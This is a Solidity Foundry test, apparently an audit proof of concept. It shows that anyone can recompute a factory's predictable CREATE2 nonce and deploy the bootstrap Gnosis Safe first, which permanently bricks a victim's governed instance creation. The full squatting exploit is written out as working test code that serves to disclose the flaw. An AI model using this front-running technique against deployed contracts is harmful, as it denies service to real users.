// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/proxies/GnosisSafeProxyFactory.sol";

import {GovernedTrustgraphsFactory} from "src/factory/GovernedTrustgraphsFactory.sol";
import {
    GovernedAuthorityDeployer,
    MerkleGovModuleDeployer,
    SignerSyncModuleDeployer
} from "src/factory/InstanceDeployers.sol";
import {TrustgraphsFactory} from "src/factory/TrustgraphsFactory.sol";
import {TrustgraphsFactoryBase} from "test/unit/factory/TrustgraphsFactoryBase.sol";

/// @notice `GovernedTrustgraphsFactory._createBootstrapSafe` derives its Safe CREATE2 nonce from
///         `keccak256(chainid, creator, name, salt)` and its initializer from a constant shape, so
///         both are fully predictable. `GnosisSafeProxyFactory.createProxyWithNonce` is
///         permissionless and reverts "Create2 call failed" when the address already has code,
///         so anyone can deploy the exact proxy first and brick that creator's governed creation.
contract QuillBehav_SafeSquatDoS is TrustgraphsFactoryBase {
    GovernedTrustgraphsFactory internal governedFactory;
    GnosisSafe internal safeSingleton;
    GnosisSafeProxyFactory internal safeFactory;

    address internal victim = address(0xA11CE);
    address internal squatter = address(0x5D0A7);

    function setUp() public override {
        super.setUp();
        safeSingleton = new GnosisSafe();
        safeFactory = new GnosisSafeProxyFactory();
        governedFactory = new GovernedTrustgraphsFactory(
            factory,
            safeFactory,
            address(safeSingleton),
            new GovernedAuthorityDeployer(),
            new SignerSyncModuleDeployer(),
            new MerkleGovModuleDeployer()
        );
    }

    function _bootstrapInitializer(address wrapper) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = wrapper;
        return abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            uint256(1),
            address(0),
            bytes(""),
            address(0),
            address(0),
            uint256(0),
            address(0)
        );
    }

    function _noSigner() internal pure returns (GovernedTrustgraphsFactory.SignerSyncConfig memory) {
        return GovernedTrustgraphsFactory.SignerSyncConfig({
            enabled: false,
            verifier: address(0),
            programVKey: bytes32(0),
            topN: 0,
            minThreshold: 0,
            targetThresholdBps: 0
        });
    }

    function test_AnyoneCanPreDeployTheBootstrapSafeAndBrickGovernedCreation() public {
        TrustgraphsFactory.CreateArgs memory args = _args("member-owned");
        args.salt = bytes32(uint256(7));

        // 1. Sanity: without interference the victim's creation succeeds. Record what it costs
        //    the squatter to reproduce, then roll back with a snapshot.
        uint256 snap = vm.snapshotState();
        vm.prank(victim);
        governedFactory.createGovernedInstance(
            args, GovernedTrustgraphsFactory.InitialPolicy({minPaidIntervalBlocks: 0, maxPerRootUsd: 0}), _noSigner()
        );
        vm.revertToState(snap);

        // 2. The squatter reproduces the wrapper's own derivation from public data only.
        uint256 nonce = uint256(keccak256(abi.encode(block.chainid, victim, args.name, args.salt)));
        bytes memory initializer = _bootstrapInitializer(address(governedFactory));

        vm.prank(squatter);
        address squatted = address(safeFactory.createProxyWithNonce(address(safeSingleton), initializer, nonce));
        assertTrue(squatted.code.length > 0, "squatter deployed the wrapper's bootstrap Safe");

        // 3. The victim's governed creation is now permanently unavailable for this
        //    (creator, name, salt) triple.
        vm.prank(victim);
        vm.expectRevert(bytes("Create2 call failed"));
        governedFactory.createGovernedInstance(
            args, GovernedTrustgraphsFactory.InitialPolicy({minPaidIntervalBlocks: 0, maxPerRootUsd: 0}), _noSigner()
        );

        // 4. The squatted Safe is inert: its only owner is the wrapper, which exposes no path to
        //    drive it outside `createGovernedInstance`. So the address is burned, not captured.
        address[] memory owners = GnosisSafe(payable(squatted)).getOwners();
        assertEq(owners.length, 1);
        assertEq(owners[0], address(governedFactory), "orphan Safe is owned by the wrapper and unusable");
    }
}
